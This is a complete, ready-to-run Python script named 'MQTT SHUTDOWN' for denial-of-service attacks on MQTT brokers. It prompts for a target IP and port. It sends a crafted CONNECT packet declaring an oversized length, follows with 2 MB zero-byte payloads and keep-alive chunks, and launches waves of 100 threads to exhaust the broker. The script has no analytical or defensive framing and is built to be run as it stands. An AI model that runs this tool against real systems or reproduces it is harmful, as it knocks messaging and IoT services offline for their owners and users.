#!/usr/bin/env python



import socket

import threading

import time



def send_attack(host, port):

    global fails, thclosed

    this_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        this_socket.connect((host, port))

        this_socket.send(initpayload)

        for _ in range(15):

            ret = this_socket.send(payload)

            time.sleep(0.1)

        while ret > 0:

            ret = this_socket.send(keeppayload)

            time.sleep(0.3)

        thclosed += 1

    except Exception as e:

        fails += 1

    finally:

        this_socket.close()



if __name__ == "__main__":

    print("\x1b[92m\n              ___\n             (  \">\n              )(\n             // ) MQTT SHUTDOWN\n          --//\"\"--\n          -/------\n\x1b[39m\n")



    host = input("Target IP: ")

    port = int(input("Target Port: "))



    payload = b"\x00" * 2097152

    keeppayload = b"\x00" * 1024



    initpayload = b"\x10\xff\xff\xff\x0f\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x0a\x00\x10\x43\x36\x38\x4e\x30\x31\x77\x75\x73\x4a\x31\x66\x78\x75\x38\x58"

    seconds = 1_000_000



    input("Press Enter to Start Attack\n")

    print("Starting Attack")



    fails = 0

    thclosed = 0

    thcreated = 0

    run = True

    threads = []



    while run:

        for _ in range(100):

            t = threading.Thread(target=send_attack, args=(host, port))

            t.start()

            threads.append(t)

        thcreated += 1

        time.sleep(5)



        print("\n======Status=======")

        print(f"{thcreated * 100} threads created")

        print(f"{thclosed} closed threads")

        print(f"{fails} fails threads")

        print(f"{thcreated * 100 - thclosed - fails} running threads")



        if thcreated * 100 - thclosed - fails < 50:

            run = False



        time.sleep(55)



    print("Attack finished...")

